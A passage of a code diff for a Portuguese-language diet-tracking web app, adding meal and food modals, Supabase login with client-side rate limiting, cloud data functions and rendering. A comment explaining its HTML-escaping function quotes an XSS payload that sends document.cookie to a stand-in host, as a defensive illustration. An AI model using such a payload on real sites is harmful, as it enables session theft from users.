+            <span class="meal-type-name">Almoço</span>
+          </div>
+          <div class="meal-type-option" data-type="Lanche" data-emoji="🥪">
+            <div class="meal-type-emoji">🥪</div>
+            <span class="meal-type-name">Lanche</span>
+          </div>
+          <div class="meal-type-option" data-type="Jantar" data-emoji="🌙">
+            <div class="meal-type-emoji">🌙</div>
+            <span class="meal-type-name">Jantar</span>
+          </div>
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label" for="meal-time-input">Horário</label>
+        <input type="time" id="meal-time-input" class="form-input" />
+      </div>
+      <div class="modal-actions">
+        <button class="btn btn-cancel" id="btn-cancel-meal">Cancelar</button>
+        <button class="btn btn-confirm" id="btn-confirm-meal">Criar refeição</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================================================================
+    MODAL: ADICIONAR ALIMENTO (com biblioteca)
+
+    Este modal agora tem duas partes:
+    1. Campo de BUSCA — filtra alimentos já cadastrados na biblioteca
+    2. Formulário MANUAL — para cadastrar alimentos novos
+
+    Fluxo:
+    a) Usuário abre o modal
+    b) Digita no campo de busca
+    c) Se encontrar na biblioteca → clica → só digita quantidade
+    d) Se não encontrar → preenche os macros manualmente
+    e) Ao confirmar → salva na biblioteca E adiciona à refeição
+  ================================================================ -->
+  <div class="modal-overlay" id="modal-food">
+    <div class="modal">
+      <div class="modal-title">Adicionar alimento</div>
+
+      <!-- BUSCA na biblioteca -->
+      <div class="form-group">
+        <label class="form-label">Buscar na sua biblioteca</label>
+        <div class="food-search-wrapper">
+          <span class="food-search-icon">🔍</span>
+          <input
+            type="text"
+            id="food-search-input"
+            class="food-search-input"
+            placeholder="Ex: frango, arroz, whey..."
+            autocomplete="off"
+            maxlength="100"
+          />
+        </div>
+
+        <!-- Lista de sugestões (aparece enquanto digita) -->
+        <div class="food-suggestions" id="food-suggestions"></div>
+      </div>
+
+      <!-- Indicador quando um alimento da biblioteca é selecionado -->
+      <div class="selected-food-indicator" id="selected-food-indicator">
+        <span class="selected-food-name" id="selected-food-name">—</span>
+        <button class="btn-clear-selection" id="btn-clear-selection" title="Remover seleção">✕</button>
+      </div>
+
+      <!-- Divisor -->
+      <div class="food-divider" id="food-divider">
+        <span id="divider-text">ou cadastre um novo</span>
+      </div>
+
+      <!-- Nome (só aparece quando está cadastrando novo) -->
+      <div class="form-group" id="food-name-group">
+        <label class="form-label" for="food-name-input">Nome do alimento</label>
+        <input type="text" id="food-name-input" class="form-input" placeholder="Ex: Frango grelhado" autocomplete="off" maxlength="100" />
+      </div>
+
+      <!-- Quantidade (sempre aparece) -->
+      <div class="form-group">
+        <label class="form-label" for="food-qty-input">Quantidade consumida</label>
+        <input type="number" id="food-qty-input" class="form-input" placeholder="Ex: 200" min="0" max="10000" />
+        <div class="form-hint">em gramas (g)</div>
+      </div>
+
+      <!-- Campos de macro (ficam bloqueados quando vem da biblioteca) -->
+      <div class="macro-fields" id="macro-fields">
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label" for="food-kcal-input">Calorias</label>
+            <input type="number" id="food-kcal-input" class="form-input" placeholder="0" min="0" max="900" />
+            <div class="form-hint">kcal por 100g</div>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="food-prot-input">Proteína</label>
+            <input type="number" id="food-prot-input" class="form-input" placeholder="0" min="0" max="100" step="0.1" />
+            <div class="form-hint">g por 100g</div>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label" for="food-carb-input">Carboidrato</label>
+            <input type="number" id="food-carb-input" class="form-input" placeholder="0" min="0" max="100" step="0.1" />
+            <div class="form-hint">g por 100g</div>
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="food-fat-input">Gordura</label>
+            <input type="number" id="food-fat-input" class="form-input" placeholder="0" min="0" max="100" step="0.1" />
+            <div class="form-hint">g por 100g</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn btn-cancel" id="btn-cancel-food">Cancelar</button>
+        <button class="btn btn-confirm" id="btn-confirm-food">Adicionar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================================================================
+    MODAL: EDITAR QUANTIDADE
+    Modal mais simples — só edita a quantidade em gramas de um alimento
+    que já está na refeição. Os macros são recalculados automaticamente.
+  ================================================================ -->
+  <div class="modal-overlay" id="modal-edit-qty">
+    <div class="modal">
+      <div class="modal-title">Editar quantidade</div>
+
+      <div id="edit-qty-info" style="margin-bottom: 16px; padding: 12px; background: var(--bg-elevated); border-radius: var(--radius-md); font-size: 13px;">
+        <div id="edit-qty-food-name" style="font-weight: 500; margin-bottom: 4px;"></div>
+        <div id="edit-qty-current-macros" style="color: var(--text-secondary); font-family: var(--font-mono); font-size: 11px;"></div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="edit-qty-input">Nova quantidade</label>
+        <input type="number" id="edit-qty-input" class="form-input" placeholder="100" min="0" step="1" />
+        <div class="form-hint">em gramas (g)</div>
+      </div>
+
+      <div id="edit-qty-preview" style="margin-top: 12px; padding: 10px 12px; background: var(--accent-dim); color: var(--accent-text); border-radius: var(--radius-md); font-size: 12px; font-family: var(--font-mono); display: none;"></div>
+
+      <div class="modal-actions">
+        <button class="btn btn-cancel" id="btn-cancel-edit-qty">Cancelar</button>
+        <button class="btn btn-confirm" id="btn-confirm-edit-qty">Salvar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================================================================
+    MODAL: DUPLICAR DIA
+    Mostra os últimos 7 dias que tiveram refeições. O usuário
+    clica em um e todas as refeições + alimentos são copiados
+    para o dia atual.
+  ================================================================ -->
+  <div class="modal-overlay" id="modal-duplicate">
+    <div class="modal">
+      <div class="modal-title">Copiar refeições de outro dia</div>
+      <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px; line-height: 1.5;">
+        Selecione um dia para copiar todas as refeições e alimentos para hoje.
+      </p>
+      <div id="duplicate-day-list">
+        <div style="text-align:center;color:var(--text-muted);padding:20px;font-size:13px;">Carregando...</div>
+      </div>
+      <div class="modal-actions" style="margin-top:16px">
+        <button class="btn btn-cancel" id="btn-cancel-duplicate">Cancelar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================================================================
+    MODAL: EDITAR REFEIÇÃO
+    Permite mudar o nome/tipo e horário de uma refeição existente.
+  ================================================================ -->
+  <div class="modal-overlay" id="modal-edit-meal">
+    <div class="modal">
+      <div class="modal-title">Editar refeição</div>
+
+      <div class="form-group">
+        <label class="form-label">Tipo de refeição</label>
+        <div class="meal-type-grid" id="edit-meal-type-grid">
+          <div class="meal-type-option" data-type="Café da manhã" data-emoji="☀️">
+            <div class="meal-type-emoji">☀️</div>
+            <span class="meal-type-name">Café da manhã</span>
+          </div>
+          <div class="meal-type-option" data-type="Almoço" data-emoji="🍽️">
+            <div class="meal-type-emoji">🍽️</div>
+            <span class="meal-type-name">Almoço</span>
+          </div>
+          <div class="meal-type-option" data-type="Lanche" data-emoji="🥪">
+            <div class="meal-type-emoji">🥪</div>
+            <span class="meal-type-name">Lanche</span>
+          </div>
+          <div class="meal-type-option" data-type="Jantar" data-emoji="🌙">
+            <div class="meal-type-emoji">🌙</div>
+            <span class="meal-type-name">Jantar</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="edit-meal-time">Horário</label>
+        <input type="time" id="edit-meal-time" class="form-input" />
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn btn-cancel" id="btn-cancel-edit-meal">Cancelar</button>
+        <button class="btn btn-confirm" id="btn-confirm-edit-meal">Salvar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================================================================
+    MODAL: DEFINIR OBJETIVOS
+    Aqui o usuário configura as metas diárias de macros.
+    Os valores são salvos no localStorage e carregados no próximo acesso.
+  ================================================================ -->
+  <div class="modal-overlay" id="modal-goals">
+    <div class="modal">
+      <div class="modal-title">Definir objetivos</div>
+
+      <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 18px; line-height: 1.5;">
+        Configure suas metas diárias. Os cards e barras de progresso vão refletir esses valores automaticamente.
+      </p>
+
+      <div class="form-group">
+        <label class="form-label" for="goal-kcal-input">
+          <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--kcal-color);margin-right:6px;"></span>
+          Calorias (kcal)
+        </label>
+        <input type="number" id="goal-kcal-input" class="form-input" placeholder="2000" min="0" step="50" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="goal-prot-input">
+          <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--prot-color);margin-right:6px;"></span>
+          Proteína (g)
+        </label>
+        <input type="number" id="goal-prot-input" class="form-input" placeholder="150" min="0" step="5" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="goal-carb-input">
+          <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--carb-color);margin-right:6px;"></span>
+          Carboidrato (g)
+        </label>
+        <input type="number" id="goal-carb-input" class="form-input" placeholder="200" min="0" step="5" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="goal-fat-input">
+          <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--fat-color);margin-right:6px;"></span>
+          Gordura (g)
+        </label>
+        <input type="number" id="goal-fat-input" class="form-input" placeholder="65" min="0" step="5" />
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn btn-cancel" id="btn-cancel-goals">Cancelar</button>
+        <button class="btn btn-confirm" id="btn-confirm-goals">Salvar objetivos</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOAST -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    /* =====================================================================
+       SUPABASE — conexão com o banco de dados na nuvem
+
+       Essas duas linhas são tudo que precisamos para conectar.
+       A URL identifica o projeto. A anon key é pública e segura —
+       a segurança real é feita pelo RLS (Row Level Security) que
+       configuramos nas tabelas.
+    ===================================================================== */
+    const SUPABASE_URL = 'https://xxjfursxhsppjmrkwgeb.supabase.co';
+    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh4amZ1cnN4aHNwcGptcmt3Z2ViIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc1MDQ5OTcsImV4cCI6MjA5MzA4MDk5N30.LHun7Br2weqEvWsyIpnL8oyPhMHBBOiGF5ndHzgKPLM';
+
+    /*
+       createClient() é a função da biblioteca Supabase que cria
+       o "client" — o objeto que usamos para falar com o banco.
+       A partir daqui, tudo passa por essa variável "sb".
+    */
+    const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    /* =====================================================================
+       AUTENTICAÇÃO — login, cadastro, logout, sessão
+
+       O Supabase gerencia tudo: hash da senha, token JWT, refresh
+       automático da sessão. Você nunca lida com senhas diretamente.
+    ===================================================================== */
+    let authMode = 'login'; // 'login' ou 'signup'
+    let currentUser = null;
+
+    function toggleAuthMode() {
+      authMode = authMode === 'login' ? 'signup' : 'login';
+      document.getElementById('btn-auth').textContent = authMode === 'login' ? 'Entrar' : 'Criar conta';
+      document.getElementById('auth-toggle-text').textContent = authMode === 'login' ? 'Não tem conta?' : 'Já tem conta?';
+      document.getElementById('auth-toggle-link').textContent = authMode === 'login' ? 'Criar conta' : 'Entrar';
+      document.getElementById('auth-subtitle').textContent = authMode === 'login'
+        ? 'Entre para acessar seus dados de qualquer lugar'
+        : 'Crie sua conta gratuita para começar';
+      document.getElementById('auth-error').classList.remove('visible');
+    }
+
+    function showAuthError(msg) {
+      const el = document.getElementById('auth-error');
+      el.textContent = msg;
+      el.classList.add('visible');
+    }
+
+    /*
+       RATE LIMITING — proteção contra brute force
+
+       Conta as tentativas de login falhas. Após 5 falhas seguidas,
+       bloqueia o botão por 30 segundos. O contador reseta ao ter
+       sucesso ou após o timeout.
+
+       Isso funciona no frontend — é uma primeira barreira. O Supabase
+       também tem rate limiting no servidor, mas essa camada extra
+       impede que scripts automatizados nem cheguem a fazer requisições.
+    */
+    let authFailCount = 0;
+    let authLockUntil = 0;
+
+    document.getElementById('btn-auth').addEventListener('click', async () => {
+      const email = document.getElementById('auth-email').value.trim();
+      const password = document.getElementById('auth-password').value;
+      const btn = document.getElementById('btn-auth');
+
+      // Verifica se está bloqueado
+      const now = Date.now();
+      if (now < authLockUntil) {
+        const secsLeft = Math.ceil((authLockUntil - now) / 1000);
+        showAuthError(`Muitas tentativas. Aguarde ${secsLeft} segundos.`);
+        return;
+      }
+
+      if (!email || !password) { showAuthError('Preencha email e senha'); return; }
+      if (password.length < 6) { showAuthError('A senha precisa ter pelo menos 6 caracteres'); return; }
+
+      // Validação básica de formato de email
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        showAuthError('Formato de email inválido');
+        return;
+      }
+
+      btn.classList.add('btn-loading');
+      btn.textContent = 'Aguarde...';
+      document.getElementById('auth-error').classList.remove('visible');
+
+      try {
+        let result;
+        if (authMode === 'login') {
+          result = await sb.auth.signInWithPassword({ email, password });
+        } else {
+          result = await sb.auth.signUp({ email, password });
+        }
+
+        if (result.error) {
+          authFailCount++;
+
+          // Após 5 falhas, bloqueia por 30 segundos
+          if (authFailCount >= 5) {
+            authLockUntil = Date.now() + 30000;
+            authFailCount = 0;
+            showAuthError('Muitas tentativas falhas. Bloqueado por 30 segundos.');
+          } else {
+            let msg = result.error.message;
+            if (msg.includes('Invalid login')) msg = 'Email ou senha incorretos';
+            if (msg.includes('already registered')) msg = 'Esse email já está cadastrado. Tente entrar.';
+            showAuthError(msg);
+          }
+        } else {
+          // Login com sucesso — reseta contador
+          authFailCount = 0;
+        }
+      } catch (err) {
+        showAuthError('Erro de conexão. Tente novamente.');
+      }
+
+      btn.classList.remove('btn-loading');
+      btn.textContent = authMode === 'login' ? 'Entrar' : 'Criar conta';
+    });
+
+    // Enter no campo de senha faz login
+    document.getElementById('auth-password').addEventListener('keydown', e => {
+      if (e.key === 'Enter') document.getElementById('btn-auth').click();
+    });
+
+    // Logout
+    document.getElementById('btn-logout').addEventListener('click', async () => {
+      await sb.auth.signOut();
+    });
+
+    /*
+       onAuthStateChange — o Supabase chama essa função automaticamente
+       quando o estado de login muda (login, logout, refresh de sessão).
+       É aqui que decidimos o que mostrar: tela de login ou o app.
+    */
+    sb.auth.onAuthStateChange(async (event, session) => {
+      if (session && session.user) {
+        currentUser = session.user;
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('app-container').classList.remove('hidden');
+        document.getElementById('bottom-nav').classList.remove('hidden');
+        await initApp();
+      } else {
+        currentUser = null;
+        document.getElementById('auth-screen').style.display = 'flex';
+        document.getElementById('app-container').classList.add('hidden');
+        document.getElementById('bottom-nav').classList.add('hidden');
+      }
+    });
+
+    /* =====================================================================
+       ESTADO DO APP
+    ===================================================================== */
+    let currentDate         = getTodayStr();
+    let allData             = {};       // carregado do Supabase na initApp
+    let activeMealId        = null;
+    let selectedLibraryFood = null;
+    let selectedMealType    = 'Café da manhã';
+    let selectedMealEmoji   = '☀️';
+    let goals = { kcal: 2000, prot: 150, carb: 200, fat: 65 };
+
+    /* =====================================================================
+       FUNÇÕES UTILITÁRIAS
+    ===================================================================== */
+    function getTodayStr() { return new Date().toISOString().split('T')[0]; }
+    function strToDate(str) { const [y,m,d] = str.split('-').map(Number); return new Date(y, m-1, d); }
+    function formatDateLong(str) {
+      return strToDate(str).toLocaleDateString('pt-BR', { weekday: 'long', day: 'numeric', month: 'long' });
+    }
+    function formatDateShort(str) { return strToDate(str).toLocaleDateString('pt-BR'); }
+    function offsetDate(str, days) {
+      const d = strToDate(str);
+      d.setDate(d.getDate() + days);
+      return d.toISOString().split('T')[0];
+    }
+    function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2, 5); }
+    function calcMacro(valuePer100, qty) { return Math.round((valuePer100 / 100) * qty * 10) / 10; }
+
+    /*
+       escapeHTML — sanitiza strings antes de inserir no DOM via innerHTML.
+
+       O XSS (Cross-Site Scripting) acontece quando dados do usuário são
+       inseridos no HTML sem tratamento. Por exemplo, se alguém cadastra
+       um alimento com o nome:
+         <img src=x onerror="fetch('https://hacker.com?token='+document.cookie)">
+
+       Sem sanitização, o navegador interpreta isso como HTML real e executa
+       o código JavaScript malicioso. A função abaixo substitui os 5
+       caracteres que o HTML usa como controle por suas versões "seguras"
+       (HTML entities), fazendo com que o navegador exiba o texto literalmente
+       em vez de interpretar como código.
+
+       & → &amp;   (deve ser o primeiro, senão corrompe os outros)
+       < → &lt;    (impede abertura de tags)
+       > → &gt;    (impede fechamento de tags)
+       " → &quot;  (impede quebra de atributos com aspas duplas)
+       ' → &#039;  (impede quebra de atributos com aspas simples)
+    */
+    function escapeHTML(str) {
+      if (typeof str !== 'string') return String(str);
+      return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    /* =====================================================================
+       CAMADA DE DADOS — SUPABASE
+
+       Lembra quando criamos as funções loadDiaryData, saveDiaryData,
+       loadLibrary, saveLibrary? Agora é a hora da verdade — vamos
+       trocar o localStorage pelo Supabase.
+
+       O conceito de "abstração" que preparamos está pagando:
+       o resto do app continua chamando as mesmas funções.
+       Só o que está DENTRO delas mudou.
+
+       CONCEITOS NOVOS:
+       - async/await: "espera a internet responder antes de continuar"
+       - fetch: "manda uma requisição pela internet" (o Supabase client
+         faz isso por baixo dos panos)
+       - .from('tabela'): equivale a abrir uma planilha específica
+       - .select(): pega dados (como SELECT no SQL)
+       - .insert(): adiciona dados (como INSERT no SQL)
+       - .upsert(): adiciona OU atualiza se já existir
+       - .delete(): remove dados
+       - .eq('campo', valor): filtra (como WHERE no SQL)
+    ===================================================================== */
+
+    // Carrega todas as refeições + alimentos de um dia específico
+    // select relacional do Supabase: traz refeições e alimentos em 1 única query (evita N+1)
+    async function loadDayFromCloud(date) {
+      const { data: meals, error } = await sb
+        .from('meals')
+        .select('*, meal_foods(*)')
+        .eq('user_id', currentUser.id)
+        .eq('date', date)
+        .order('sort_order');
+
+      if (error || !meals) return { meals: [] };
+
+      return {
+        meals: meals.map(m => ({
+          id:    m.id,
+          name:  m.name,
+          emoji: m.emoji,
+          time:  m.time,
+          foods: (m.meal_foods || [])
+            .sort((a, b) => new Date(a.created_at || 0) - new Date(b.created_at || 0))
+            .map(f => ({
+              id:         f.id,
+              name:       f.name,
+              qty:        f.qty,
+              kcalPer100: f.kcal_per100,
+              protPer100: f.prot_per100,
+              carbPer100: f.carb_per100,
+              fatPer100:  f.fat_per100,
+            })),
+        }))
+      };
+    }
+
+    // Carrega dados do dia e armazena em allData
+    async function loadDiaryData() {
+      allData[currentDate] = await loadDayFromCloud(currentDate);
+    }
+
+    // Salva uma refeição no Supabase (insert)
+    /*
+       logError — função segura de log.
+       Em produção, não expõe detalhes internos no console.
+       Mostra um toast genérico para o usuário.
+       Em desenvolvimento, você pode trocar para console.error
+       se precisar debugar.
+    */
+    function logError(context, error) {
+      // Em produção: log genérico, sem expor estrutura do banco
+      if (error) showToast('Erro ao sincronizar. Tente novamente.');
+    }
+
+    async function saveMealToCloud(meal) {
+      const { data, error } = await sb.from('meals').insert({
+        id:         meal.id,
+        user_id:    currentUser.id,
+        name:       meal.name,
+        emoji:      meal.emoji,
+        time:       meal.time,
+        date:       currentDate,
+        sort_order: getMeals().length,
+      }).select().single();
+
+      logError('saveMeal', error);
+      return data;
+    }
+
+    async function saveFoodToCloud(mealId, food) {
+      const { error } = await sb.from('meal_foods').insert({
+        id:          food.id,
+        meal_id:     mealId,
+        user_id:     currentUser.id,
+        name:        food.name,
+        qty:         food.qty,
+        kcal_per100: food.kcalPer100,
+        prot_per100: food.protPer100,
+        carb_per100: food.carbPer100,
+        fat_per100:  food.fatPer100,
+      });
+      logError('saveFood', error);
+    }
+
+    async function deleteFoodFromCloud(foodId) {
+      const { error } = await sb.from('meal_foods').delete().eq('id', foodId);
+      logError('deleteFood', error);
+    }
+
+    async function updateFoodQtyInCloud(foodId, newQty) {
+      const { error } = await sb.from('meal_foods').update({ qty: newQty }).eq('id', foodId);
+      logError('updateQty', error);
+    }
+
+    /* --- BIBLIOTECA DE ALIMENTOS (Supabase) --- */
+    function loadLibrary() {
+      // Retorna cache local — carregada na initApp
+      return window._foodLibraryCache || [];
+    }
+
+    async function loadLibraryFromCloud() {
+      const { data, error } = await sb
+        .from('food_library')
+        .select('*')
+        .eq('user_id', currentUser.id)
+        .order('usage_count', { ascending: false });
+
+      if (error || !data) return [];
+
+      return data.map(f => ({
+        id:         f.id,
+        name:       f.name,
+        kcalPer100: f.kcal_per100,
+        protPer100: f.prot_per100,
+        carbPer100: f.carb_per100,
+        fatPer100:  f.fat_per100,
+        usageCount: f.usage_count,
+      }));
+    }
+
+    async function upsertLibraryFood(food) {
+      const library  = loadLibrary();
+      const nameLower = food.name.toLowerCase().trim();
+      const existing = library.find(item => item.name.toLowerCase().trim() === nameLower);
+
+      if (existing) {
+        // Atualiza contagem de uso no banco
+        existing.usageCount = (existing.usageCount || 0) + 1;
+        await sb.from('food_library')
+          .update({ usage_count: existing.usageCount })
+          .eq('id', existing.id);
+      } else {
+        // Insere novo na biblioteca
+        const { data } = await sb.from('food_library').insert({
+          user_id:     currentUser.id,
+          name:        food.name.trim(),
+          kcal_per100: food.kcalPer100,
+          prot_per100: food.protPer100,
+          carb_per100: food.carbPer100,
+          fat_per100:  food.fatPer100,
+          usage_count: 1,
+        }).select().single();
+
+        if (data) {
+          library.push({
+            id:         data.id,
+            name:       data.name,
+            kcalPer100: data.kcal_per100,
+            protPer100: data.prot_per100,
+            carbPer100: data.carb_per100,
+            fatPer100:  data.fat_per100,
+            usageCount: data.usage_count,
+          });
+        }
+      }
+
+      window._foodLibraryCache = library;
+      return library;
+    }
+
+    function searchLibrary(query) {
+      if (!query || query.trim().length < 1) return [];
+      const library    = loadLibrary();
+      const queryLower = query.toLowerCase().trim();
+
+      return library
+        .filter(item => item.name.toLowerCase().includes(queryLower))
+        .sort((a, b) => (b.usageCount || 0) - (a.usageCount || 0))
+        .slice(0, 6);
+    }
+
+    async function deleteLibraryFood(foodId) {
+      await sb.from('food_library').delete().eq('id', foodId);
+      window._foodLibraryCache = loadLibrary().filter(item => item.id !== foodId);
+    }
+
+    /* --- METAS (Supabase) --- */
+    async function loadGoals() {
+      const { data, error } = await sb
+        .from('user_goals')
+        .select('*')
+        .eq('user_id', currentUser.id)
+        .maybeSingle();  // maybeSingle em vez de single — não dá erro se não existir
+
+      if (data) {
+        goals = { kcal: data.kcal, prot: data.prot, carb: data.carb, fat: data.fat };
+      }
+      // Se não existe, mantém os valores padrão
+    }
+
+    async function saveGoals() {
+      await sb.from('user_goals').upsert(
+        {
+          user_id: currentUser.id,
+          kcal:    goals.kcal,
+          prot:    goals.prot,
+          carb:    goals.carb,
+          fat:     goals.fat,
+        },
+        { onConflict: 'user_id' }  // se já existe para esse user, faz UPDATE
+      );
+    }
+
+    /* =====================================================================
+       MIGRAÇÃO — traz dados do localStorage para o Supabase
+
+       Se o usuário já usava o app antes do Supabase, os dados estão
+       no localStorage. Essa função verifica e migra automaticamente.
+       Roda uma única vez, depois limpa os dados locais.
+    ===================================================================== */
+    async function migrateLocalData() {
+      const localKey = 'dietlog_diary';
+      const raw = localStorage.getItem(localKey);
+      if (!raw) return; // nada para migrar
+
+      try {
+        const localData = JSON.parse(raw);
+        const dates = Object.keys(localData);
+        if (dates.length === 0) return;
+
+        showToast('Migrando seus dados para a nuvem...');
+
+        for (const date of dates) {
+          const day = localData[date];
+          if (!day.meals || day.meals.length === 0) continue;
+
+          for (const meal of day.meals) {
+            // Insere a refeição
+            const { data: savedMeal } = await sb.from('meals').insert({
+              user_id: currentUser.id,
+              name: meal.name,
+              emoji: meal.emoji || '🍽️',
+              time: meal.time || '--:--',
+              date: date,
+            }).select().single();
+
+            if (!savedMeal) continue;
+
+            // Insere os alimentos
+            for (const food of (meal.foods || [])) {
+              await sb.from('meal_foods').insert({
+                meal_id:     savedMeal.id,
+                user_id:     currentUser.id,
+                name:        food.name,
+                qty:         food.qty,
+                kcal_per100: food.kcalPer100 || 0,
+                prot_per100: food.protPer100 || 0,
+                carb_per100: food.carbPer100 || 0,
+                fat_per100:  food.fatPer100  || 0,
+              });
+            }
+          }
+        }
+
+        // Migra biblioteca
+        const localLib = localStorage.getItem('dietlog_library');
+        if (localLib) {
+          const lib = JSON.parse(localLib);
+          for (const food of lib) {
+            await sb.from('food_library').insert({
+              user_id:     currentUser.id,
+              name:        food.name,
+              kcal_per100: food.kcalPer100 || 0,
+              prot_per100: food.protPer100 || 0,
+              carb_per100: food.carbPer100 || 0,
+              fat_per100:  food.fatPer100  || 0,
+              usage_count: food.usageCount || 1,
+            });
+          }
+        }
+
+        // Migra metas
+        const localGoals = localStorage.getItem('dietlog_goals');
+        if (localGoals) {
+          const g = JSON.parse(localGoals);
+          await sb.from('user_goals').upsert({
+            user_id: currentUser.id,
+            kcal: g.kcal || 2000,
+            prot: g.prot || 150,
+            carb: g.carb || 200,
+            fat:  g.fat  || 65,
+          });
+        }
+
+        // Limpa dados locais (já estão na nuvem)
+        localStorage.removeItem(localKey);
+        localStorage.removeItem('dietlog_library');
+        localStorage.removeItem('dietlog_goals');
+        localStorage.removeItem('dietlog_data'); // chave antiga
+
+        showToast('Dados migrados com sucesso!');
+      } catch (err) {
+        logError('migration', err);
+      }
+    }
+
+    /* =====================================================================
+       INICIALIZAÇÃO DO APP — roda depois do login
+    ===================================================================== */
+    async function initApp() {
+      await migrateLocalData();
+      await loadGoals();
+      window._foodLibraryCache = await loadLibraryFromCloud();
+      await loadDiaryData();
+      render();
+    }
+
+    /* =====================================================================
+       FUNÇÕES DO DIÁRIO (iguais à versão anterior)
+    ===================================================================== */
+    function ensureDay(date) {
+      if (!allData[date]) allData[date] = { meals: [] };
+    }
+    function getMeals() {
+      ensureDay(currentDate);
+      return allData[currentDate].meals;
+    }
+    function calcDayTotals() {
+      const totals = { kcal: 0, prot: 0, carb: 0, fat: 0 };
+      getMeals().forEach(meal => {
+        meal.foods.forEach(food => {
+          totals.kcal += calcMacro(food.kcalPer100, food.qty);
+          totals.prot += calcMacro(food.protPer100, food.qty);
+          totals.carb += calcMacro(food.carbPer100, food.qty);
+          totals.fat  += calcMacro(food.fatPer100,  food.qty);
+        });
+      });
+      totals.kcal = Math.round(totals.kcal);
+      totals.prot = Math.round(totals.prot * 10) / 10;
+      totals.carb = Math.round(totals.carb * 10) / 10;
+      totals.fat  = Math.round(totals.fat  * 10) / 10;
+      return totals;
+    }
+
+    /* =====================================================================
+       RENDERIZAÇÃO
+    ===================================================================== */
+    function render() {
+      renderDate();
+      renderMacros();
+      renderMeals();
+      renderLibraryCount();
+    }
+
+    function renderDate() {
+      const today   = getTodayStr();
+      const isToday = currentDate === today;
+      const longDate = formatDateLong(currentDate);
+      const dateText = longDate.charAt(0).toUpperCase() + longDate.slice(1);
+
+      // Aqui usamos innerHTML mas os dados vêm de formatDateLong (gerado pelo
+      // browser, não pelo usuário) e o badge é HTML estático controlado por nós.
+      // Mesmo assim, sanitizamos o texto da data por precaução.
+      document.getElementById('date-main').innerHTML =
+        escapeHTML(dateText) +
+        (isToday ? ' <span class="date-today-badge">hoje</span>' : '');
+
+      document.getElementById('date-sub').textContent = formatDateShort(currentDate);
+      document.getElementById('btn-next-day').disabled    = isToday;
+      document.getElementById('btn-next-day').style.opacity = isToday ? '0.3' : '1';
+    }
+
+    function renderMacros() {
+      const t = calcDayTotals();
+
+      // Atualiza os valores consumidos
+      document.getElementById('total-kcal').textContent = t.kcal;
+      document.getElementById('total-prot').textContent = t.prot + 'g';
+      document.getElementById('total-carb').textContent = t.carb + 'g';
+      document.getElementById('total-fat').textContent  = t.fat  + 'g';
+
+      // Atualiza os textos de meta (reflete mudanças do modal de objetivos)
+      document.getElementById('goal-kcal').textContent = goals.kcal;
+      document.getElementById('goal-prot').textContent = goals.prot;
+      document.getElementById('goal-carb').textContent = goals.carb;
+      document.getElementById('goal-fat').textContent  = goals.fat;
+
+      // Calcula porcentagens e atualiza barras + texto de %
+      const pct = (val, goal) => goal > 0 ? Math.min(100, Math.round((val / goal) * 100)) : 0;
+
+      const pctKcal = pct(t.kcal, goals.kcal);
+      const pctProt = pct(t.prot, goals.prot);
+      const pctCarb = pct(t.carb, goals.carb);
+      const pctFat  = pct(t.fat,  goals.fat);
+
+      document.getElementById('bar-kcal').style.width = pctKcal + '%';
+      document.getElementById('bar-prot').style.width = pctProt + '%';
+      document.getElementById('bar-carb').style.width = pctCarb + '%';
+      document.getElementById('bar-fat').style.width  = pctFat  + '%';
+
+      document.getElementById('pct-kcal').textContent = pctKcal + '%';
+      document.getElementById('pct-prot').textContent = pctProt + '%';
+      document.getElementById('pct-carb').textContent = pctCarb + '%';
+      document.getElementById('pct-fat').textContent  = pctFat  + '%';
+    }
+
+    function renderMeals() {
+      const meals     = getMeals();
+      const container = document.getElementById('meals-list');
+      const emptyState = document.getElementById('empty-state');
+      emptyState.style.display = meals.length === 0 ? 'block' : 'none';
+      container.querySelectorAll('.meal-card').forEach(el => el.remove());
+      meals.forEach(meal => container.appendChild(createMealCard(meal)));
+    }
+
+    /* Atualiza o contador de alimentos na biblioteca no header */
+    function renderLibraryCount() {
+      const count = loadLibrary().length;
+      document.getElementById('library-count').textContent =
+        `📚 ${count} alimento${count !== 1 ? 's' : ''}`;
+    }
+
+    function createMealCard(meal) {
+      const mealKcal = Math.round(
+        meal.foods.reduce((sum, f) => sum + calcMacro(f.kcalPer100, f.qty), 0)
+      );
+      const card = document.createElement('div');
+      card.className = 'meal-card';
+      card.dataset.id = meal.id;
